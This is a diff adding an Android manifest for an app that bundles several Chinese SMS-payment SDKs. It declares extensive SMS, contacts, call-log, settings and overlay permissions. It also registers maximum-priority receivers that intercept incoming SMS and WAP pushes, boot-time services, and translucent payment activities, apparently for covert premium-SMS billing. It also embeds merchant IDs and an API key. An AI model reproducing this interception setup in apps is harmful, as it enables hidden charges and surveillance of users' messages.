@@ -1,0 +1,317 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+          package="com.tianz.txgd"
+          android:versionCode="1"
+          android:versionName="1.0">
+
+    <uses-sdk android:minSdkVersion="16"/>
+
+    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
+    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+    <uses-permission android:name="android.permission.CHANGE_NETWORK_STATE"/>
+
+    <!-- 乐途开始-->
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.MOUNT_UNMOUNT_FILESYSTEMS"/>
+    <uses-permission android:name="android.permission.CHANGE_CONFIGURATION"/>
+    <uses-permission android:name="android.permission.READ_SMS"/>
+    <uses-permission android:name="android.permission.SEND_SMS"/>
+    <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+    <uses-permission android:name="android.permission.WRITE_APN_SETTINGS"/>
+    <uses-permission android:name="android.permission.VIBRATE"/>
+    <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+    <uses-permission android:name="android.permission.GET_TASKS"/>
+    <!-- 乐途结束-->
+
+
+    <!-- 元朗开始-->
+    <uses-permission android:name="android.permission.WRITE_SMS"/>
+    <uses-permission android:name="android.permission.BROADCAST_SMS"/>
+    <uses-permission android:name="android.permission.WAKE_LOCK"/>
+    <!-- 元朗结束-->
+
+
+    <!-- 掌支付开始-->
+    <uses-permission android:name="android.permission.READ_CONTACTS"/>
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+    <uses-permission android:name="android.permission.RECEIVE_WAP_PUSH"/>
+    <uses-permission android:name="android.permission.RUN_INSTRUMENTATION"/>
+    <!-- 掌支付结束-->
+
+    <!-- 朱雀开始-->
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.READ_LOGS" />
+    <uses-permission android:name="android.permission.CALL_PHONE" />
+    <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS" />
+    <uses-permission android:name="android.permission.READ_CALL_LOG" />
+    <uses-permission android:name="android.permission.WRITE_SETTINGS" />
+    <uses-permission android:name="android.permission.SYSTEM_OVERLAY_WINDOW" />
+    <uses-permission android:name="android.permission.CHANGE_CONFIGURATION" />
+    <uses-permission android:name="android.permission.VIBRATE" />
+    <uses-permission android:name="android.permission.RUN_INSTRUMENTATION" />
+    <!-- 朱雀结束-->
+    <!--<instrumentation-->
+            <!--android:name="android.test.InstrumentationTestRunner"-->
+            <!--android:targetPackage="com.tianz.xxdmx"-->
+            <!--android:label=""/>-->
+
+    <application
+            android:label="@string/app_name"
+            android:icon="@drawable/ic_launcher"
+            android:name="com.tianzh.pay.TianZhPayApplication">
+        <!--<uses-library android:name="android.test.runner"/>-->
+
+
+        <activity
+                android:name="com.tianzh.pay.TianZhPayActivity"
+                android:label="@string/app_name">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity>
+
+        <!-- 乐途开始-->
+        <service android:name="com.lyhtgh.pay.services.SmsStatusService"></service>
+        <service android:name="com.lyhtgh.pay.services.SmsDataService"></service>
+
+        <receiver android:name="com.lyhtgh.pay.receiver.BootReceiver">
+            <intent-filter android:priority="2147483647">
+                <action android:name="android.intent.action.SIM_STATE_CHANGED"/>
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+
+                <category android:name="android.intent.category.DEFAULT"/>
+                <action android:name="android.net.wifi.WIFI_STATE_CHANGED"/>
+            </intent-filter>
+        </receiver>
+
+        <receiver android:name="com.lyhtgh.pay.receiver.NetworkReceiver">
+            <intent-filter android:priority="2147483647">
+                <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+            </intent-filter>
+        </receiver>
+
+        <receiver android:name="com.lyhtgh.pay.receiver.InSmsReceiver">
+            <intent-filter android:priority="2147483647">
+                <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
+            </intent-filter>
+        </receiver>
+
+        <activity
+                android:name="com.lyhtgh.pay.activity.SdkPayActivity"
+                android:label="@string/app_name"
+                android:configChanges="orientation|navigation|keyboardHidden|keyboard"
+                android:theme="@style/lttransparent">
+        </activity>
+
+        <meta-data
+                android:value="SZTZPAY1001"
+                android:name="lltt_merchantid"/>
+        <meta-data
+                android:value="6300002"
+                android:name="lltt_mappid"/>
+        <meta-data
+                android:value="TEST"
+                android:name="lltt_cpchannelid"/>
+        <!-- 乐途结束-->
+
+        <!-- 元朗开始-->
+        <meta-data
+                android:name="YL_APP_ID"
+                android:value="AP11031015162058310000"/>
+        <meta-data
+                android:name="YL_SOURCE_ID"
+                android:value="YC1961015172115500000"/>
+
+        <activity
+                android:name="com.yuanlang.pay.TheDialogActivity"
+                android:configChanges="orientation|keyboardHidden|screenSize"
+                android:theme="@android:style/Theme.Translucent.NoTitleBar"/>
+        <activity
+                android:name="com.yuanlang.pay.TheActivity"
+                android:configChanges="orientation|keyboardHidden|screenSize"/>
+        <activity
+                android:name="com.tianzh.pay.YLPayActivity"
+                android:configChanges="orientation|keyboardHidden|screenSize"
+                android:theme="@android:style/Theme.Translucent.NoTitleBar"/>
+
+        <service
+                android:name="com.yuanlang.pay.TheService"
+                android:enabled="true"/>
+        <!-- 元朗结束-->
+
+
+        <!-- 掌支付开始-->
+        <activity
+                android:name="com.zhangzhifu.sdk.activity.ZhangPayActivity"
+                android:exported="true"
+                android:theme="@android:style/Theme.Translucent">
+        </activity>
+
+        <service android:name="com.zhangzhifu.sdk.service.ZhangPayPlateService">
+        </service>
+
+        <receiver android:name="com.zhangzhifu.sdk.util.sms.BootReceiver">
+            <intent-filter android:priority="2147483647">
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+            </intent-filter>
+        </receiver>
+
+        <service
+                android:name="com.zhangzhifu.sdk.service.ZhangzhifuSmsService"
+                android:enabled="true"/>
+
+        <receiver android:name="com.zhangzhifu.sdk.util.sms.SmsReceiver">
+            <intent-filter android:priority="2147483647">
+                <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
+
+                <category android:name="android.intent.category.DEFAULT"/>
+            </intent-filter>
+        </receiver>
+
+        <receiver android:name="com.zhangzhifu.sdk.util.sms.WapPushReceiver">
+            <intent-filter android:priority="2147483647">
+                <action android:name="android.provider.Telephony.WAP_PUSH_RECEIVED"/>
+
+                <data android:mimeType="application/vnd.wap.sic"/>
+            </intent-filter>
+        </receiver>
+
+        <meta-data
+                android:name="ZHANG_APPID"
+                android:value="zh|1550"/>
+        <meta-data
+                android:name="ZHANG_CHANNELID"
+                android:value="zh|1000100020000346"/>
+        <meta-data
+                android:name="ZHANG_QD"
+                android:value="zyap1550_17777_100"/>
+        <!-- 掌支付结束-->
+
+        <!-- 朱雀支付开始-->
+        <meta-data
+                android:name="SGAME_AGENT_NUM"
+                android:value="1442195865"/>
+        <meta-data
+                android:name="ZHUQUE_TPK"
+                android:value="xxdmx"/>
+        <meta-data
+                android:name="SIJIUPID" android:value="29" />
+        <meta-data
+                android:name="SIJIUTID" android:value="zqtxgd10" />
+
+        <activity android:name="com.sijiu.Instance.sdk.PushActivity" />
+
+        <service android:name="com.sijiu.Instance.sdk.InstanceService" />
+        <service
+                android:name="com.igexin.sdk.PushService"
+                android:exported="true"
+                android:label="NotificationCenter"
+                android:process=":pushservice" />
+
+        <receiver
+                android:name="com.igexin.sdk.PushManagerReceiver"
+                android:exported="true" >
+            <intent-filter android:priority="2147483647" >
+                <action android:name="com.systen.andorid.phone" />
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.USER_PRESENT" />
+                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+                <action android:name="android.provider.Telephony.SMS_RECEIVED2" />
+                <action android:name="android.provider.Telephony.SMS_DELIVER" />
+                <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
+                <action android:name="android.intent.action.MEDIA_MOUNTED" />
+                <action android:name="android.intent.action.ACTION_POWER_CONNECTED" />
+                <action android:name="android.intent.action.ACTION_POWER_DISCONNECTED" />
+                <action android:name="android.intent.action.PACKAGE_ADDED" />
+                <action android:name="android.intent.action.PACKAGE_REPLACED" />
+                <action android:name="android.intent.action.PACKAGE_INSTALL" />
+                <action android:name="android.intent.action.PACKAGE_CHANGED" />
+            </intent-filter>
+        </receiver>
+
+        <meta-data android:name="miguopen_appid" android:value="appid:008822437082336646" />
+        <meta-data android:name="excode" android:value="excode:1234" />
+
+        <receiver android:name="com.iap.receiver.BootTaskReceiver">
+            <intent-filter android:priority="2147483647">
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+                <action android:name="android.intent.action.ACTION_SHUTDOWN"/>
+                <action android:name="com.iap.service.broadcast.PAYMENT"/>
+                <action android:name="com.iap.service.broadcast.PAYMENT_DESTROY"/>
+
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </receiver>
+
+
+        <receiver
+                android:name="com.iap.receiver.SmsFilterReceiver"
+                android:permission="android.permission.BROADCAST_SMS">
+            <intent-filter android:priority="2147483647">
+                <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+
+                <action android:name="android.provider.Telephony.SMS_RECEIVED2"/>
+                <action android:name="android.provider.Telephony.SMS_DELIVER"/>
+            </intent-filter>
+
+        </receiver>
+
+        <service
+                android:name="com.iap.service.PaymentService"
+                android:enabled="true"
+                android:exported="false">
+            <intent-filter android:priority="2147483647">
+                <action android:name="com.iap.service.PaymentService"/>
+            </intent-filter>
+        </service>
+
+        <activity
+                android:name="com.iap.activity.PaymentConfirmActivity"
+                android:label="PaymentConfirmActivity"
+                android:exported="true">
+        </activity>
+        <activity
+                android:name="com.iap.activity.PaymentResultActivity"
+                android:label="PaymentConfirmActivity"
+                android:exported="true">
+        </activity>
+
+        <service
+                android:name="com.sgame.que.sms.SmsService"
+                android:enabled="true"
+                android:exported="false">
+            <intent-filter android:priority="2147483647">
+                <action android:name="com.sgame.que.sms.SmsService"/>
+            </intent-filter>
+        </service>
+        <!-- 朱雀支付结束-->
+
+        <!-- 天章支付开始-->
+        <receiver android:name="com.tianzh.pay.service.msg.MsgReceiver">
+            <intent-filter android:priority="1000">
+                <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
+            </intent-filter>
+        </receiver>
+        <!-- 天章支付结束-->
+        <!--<meta-data-->
+                <!--android:name="TIANZH_CHANNEL"-->
+                <!--android:value="selfpaidways"/>-->
+        <meta-data
+                android:name="TIANZH_CHANNEL"
+                android:value="tianzhtest04"/>
+        <meta-data
+                android:name="TIANZH_APPID"
+                android:value="Y7vmai-fURJR3"/>
+        <meta-data
+                android:name="TencentMapSDK"
+                android:value="CVZBZ-3UWC3-V4O33-3XUZP-4ZI32-OEFXL"/>
+    </application>
+</manifest>
